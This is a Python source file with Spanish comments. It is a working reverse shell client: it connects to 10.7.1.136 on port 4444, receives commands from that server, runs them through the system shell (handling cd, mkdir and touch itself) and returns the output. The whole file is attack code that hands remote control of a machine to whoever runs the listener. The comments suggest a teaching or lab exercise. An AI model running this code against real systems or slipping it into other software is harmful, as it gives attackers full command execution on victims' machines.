import socket #Esta librería permite la conexión entre un cliente y un servidor
import subprocess #Esta librería permite ejecutar ejecutar comandos, enviar datos de entrada o recibir de salida
import os #Esta librería da funciones para poder interactuar con el sistema operativo

def ejecutar_comando(command):
    if command.lower().startswith('cd'): #Comando para moverse entre directorios
        directory = command.split(' ', 1)[1].strip()
        try:
            os.chdir(directory)
            return f"Cambiado al directorio: {os.getcwd()}"
        except Exception as e:
            return str(e)
    elif command.lower().startswith('mkdir'): #Comando para crear carpetas
        folder_name = command.split(' ', 1)[1].strip()
        try:
            os.mkdir(folder_name)
            return f"Carpeta creada: {folder_name}"
        except Exception as e:
            return str(e)
    elif command.lower().startswith('touch'): #Comando para crear archivos txt
        file_name = command.split(' ', 1)[1].strip()
        try:
            open(file_name, 'w').close()
            return f"Archivo {file_name} creado correctamente."
        except Exception as e:
            return str(e)
    else:
        return subprocess.check_output(command, shell=True).decode('latin-1') #Devuelve un comando al servidor

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Establece un socket
connection.connect(('10.7.1.136', 4444)) #Conexión con el servidor

mensaje = "\n //////Conexion establecida\n"
connection.send(mensaje.encode('latin-1')) #Comando de confirmación de conexión

while True: #Conexión persistente
    command = connection.recv(1024).decode('latin-1') #Leer comandos y decodificarlos de 'latin-1'

    if command.lower() == 'exit': #Salir
        break

    resultados_comando = ejecutar_comando(command) #Ejecutar comandos
    connection.send(resultados_comando.encode('latin-1')) #Mandar comandos al servidor

connection.close()
